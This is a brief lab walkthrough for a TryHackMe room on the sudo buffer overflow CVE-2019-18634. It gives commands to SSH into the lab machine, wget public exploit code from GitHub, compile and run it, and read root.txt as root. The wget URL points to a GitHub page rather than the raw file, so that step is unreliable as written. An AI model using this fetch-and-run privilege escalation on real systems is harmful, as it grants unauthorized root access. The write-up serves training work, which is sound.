Walkthrough about Sudo Buffer Overflow

February 7, 2022

------------------------------------------


First we are going to deploy the machine. 

After reading all of the contents in the room, we now know that we need to ssh into the machine or we need to connect to it.

There are actually steps that was given by the author of the room, therefore we will just use these commands.

First we will connect to the machine by the port 4444 and ssh service. 

```
ssh -p 4444 tryhackme@10.10.105.118
```
Then as the commands mention above we will use the 'wget' command to obtain a certain file which is the exploit itself.

```
wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
gcc -o exploit exploit.c
ls
```

The first command above will specify the file that we will get from the github and the second one is that we are going to compile the file 'exploit.c'

After that we are just listing the files in the current directory.

Then we will execute the file. 

```
./exploit
```

After that we did get the root user and we can now 'cat' the root.txt